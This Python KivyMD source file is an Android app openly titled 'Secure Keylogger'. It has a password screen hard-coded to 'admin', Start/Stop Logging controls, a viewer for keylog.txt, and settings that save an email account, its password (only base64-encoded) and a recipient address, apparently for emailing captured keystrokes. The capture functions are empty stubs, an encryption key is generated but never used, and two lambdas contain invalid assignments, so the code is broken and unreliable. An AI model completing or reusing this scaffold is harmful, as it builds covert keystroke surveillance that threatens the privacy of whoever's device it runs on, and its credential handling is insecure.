from kivymd.app import MDApp
from kivymd.uix.screen import MDScreen
from kivymd.uix.screenmanager import MDScreenManager
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.card import MDCard
from kivymd.uix.boxlayout import MDBoxLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import platform
from plyer import notification
import os
import json
import hashlib
import base64
from cryptography.fernet import Fernet
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class LoginScreen(MDScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = 'login'
        
        layout = MDBoxLayout(orientation='vertical', spacing=20, padding=20)
        
        title = MDLabel(
            text="Secure Keylogger",
            halign="center",
            font_style="H4",
            size_hint_y=None,
            height=100
        )
        
        self.password = MDTextField(
            hint_text="Enter Password",
            password=True,
            helper_text="Default password is 'admin'",
            helper_text_mode="on_focus",
            size_hint_x=0.8,
            pos_hint={'center_x': 0.5}
        )
        
        login_button = MDRaisedButton(
            text="Login",
            size_hint=(None, None),
            width=200,
            pos_hint={'center_x': 0.5},
            on_release=self.verify_password
        )
        
        layout.add_widget(title)
        layout.add_widget(self.password)
        layout.add_widget(login_button)
        
        self.add_widget(layout)
    
    def verify_password(self, instance):
        password = self.password.text
        # In production, use proper password hashing and verification
        if password == 'admin':  # Replace with secure password verification
            self.parent.current = 'main'
        else:
            notification.notify(
                title='Login Failed',
                message='Invalid password',
                app_icon=None,
                timeout=10
            )

class MainScreen(MDScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = 'main'
        self.logging_active = False
        
        layout = MDBoxLayout(orientation='vertical', spacing=10, padding=10)
        
        # Top toolbar
        toolbar = MDBoxLayout(
            size_hint_y=None,
            height=60,
            padding=10,
            spacing=10
        )
        
        self.status_label = MDLabel(
            text="Status: Stopped",
            size_hint_x=0.6
        )
        
        self.toggle_button = MDRaisedButton(
            text="Start Logging",
            on_release=self.toggle_logging
        )
        
        toolbar.add_widget(self.status_label)
        toolbar.add_widget(self.toggle_button)
        
        # Log display area
        self.log_area = MDLabel(
            text="Logs will appear here...",
            size_hint_y=0.7,
            valign='top'
        )
        
        # Settings button
        settings_button = MDRaisedButton(
            text="Settings",
            size_hint=(None, None),
            pos_hint={'center_x': 0.5},
            on_release=lambda x: self.parent.current = 'settings'
        )
        
        layout.add_widget(toolbar)
        layout.add_widget(self.log_area)
        layout.add_widget(settings_button)
        
        self.add_widget(layout)
        
        # Initialize logging system
        self.log_file = "keylog.txt"
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
        # Start log update timer
        Clock.schedule_interval(self.update_log_display, 1)
    
    def toggle_logging(self, instance):
        self.logging_active = not self.logging_active
        if self.logging_active:
            self.toggle_button.text = "Stop Logging"
            self.status_label.text = "Status: Running"
            self.start_logging()
        else:
            self.toggle_button.text = "Start Logging"
            self.status_label.text = "Status: Stopped"
            self.stop_logging()
    
    def start_logging(self):
        # Implement Android-specific logging logic here
        pass
    
    def stop_logging(self):
        # Implement logging stop logic
        pass
    
    def update_log_display(self, dt):
        if os.path.exists(self.log_file):
            with open(self.log_file, 'r') as f:
                logs = f.read()
                self.log_area.text = logs[-1000:]  # Show last 1000 characters

class SettingsScreen(MDScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.name = 'settings'
        
        layout = MDBoxLayout(orientation='vertical', spacing=20, padding=20)
        
        title = MDLabel(
            text="Settings",
            halign="center",
            font_style="H5",
            size_hint_y=None,
            height=50
        )
        
        # Email settings
        self.email = MDTextField(
            hint_text="Email Address",
            helper_text="Enter your email address",
            helper_text_mode="on_focus",
            size_hint_x=0.8,
            pos_hint={'center_x': 0.5}
        )
        
        self.password = MDTextField(
            hint_text="Email Password",
            password=True,
            helper_text="Enter your email password",
            helper_text_mode="on_focus",
            size_hint_x=0.8,
            pos_hint={'center_x': 0.5}
        )
        
        self.recipient = MDTextField(
            hint_text="Recipient Email",
            helper_text="Enter recipient email address",
            helper_text_mode="on_focus",
            size_hint_x=0.8,
            pos_hint={'center_x': 0.5}
        )
        
        save_button = MDRaisedButton(
            text="Save Settings",
            size_hint=(None, None),
            width=200,
            pos_hint={'center_x': 0.5},
            on_release=self.save_settings
        )
        
        back_button = MDRaisedButton(
            text="Back",
            size_hint=(None, None),
            width=200,
            pos_hint={'center_x': 0.5},
            on_release=lambda x: self.parent.current = 'main'
        )
        
        layout.add_widget(title)
        layout.add_widget(self.email)
        layout.add_widget(self.password)
        layout.add_widget(self.recipient)
        layout.add_widget(save_button)
        layout.add_widget(back_button)
        
        self.add_widget(layout)
        
        # Load existing settings
        self.load_settings()
    
    def save_settings(self, instance):
        settings = {
            'email': self.email.text,
            'password': base64.b64encode(self.password.text.encode()).decode(),
            'recipient': self.recipient.text
        }
        
        with open('settings.json', 'w') as f:
            json.dump(settings, f)
        
        notification.notify(
            title='Settings Saved',
            message='Your settings have been saved successfully',
            app_icon=None,
            timeout=10
        )
    
    def load_settings(self):
        if os.path.exists('settings.json'):
            with open('settings.json', 'r') as f:
                settings = json.load(f)
                self.email.text = settings.get('email', '')
                self.password.text = base64.b64decode(settings.get('password', '')).decode()
                self.recipient.text = settings.get('recipient', '')

class SecureKeyloggerApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "DeepPurple"
        self.theme_cls.theme_style = "Light"
        
        sm = MDScreenManager()
        sm.add_widget(LoginScreen())
        sm.add_widget(MainScreen())
        sm.add_widget(SettingsScreen())
        
        return sm

if __name__ == '__main__':
    if platform == 'android':
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ])
    
    Window.softinput_mode = 'below_target'
    SecureKeyloggerApp().run() 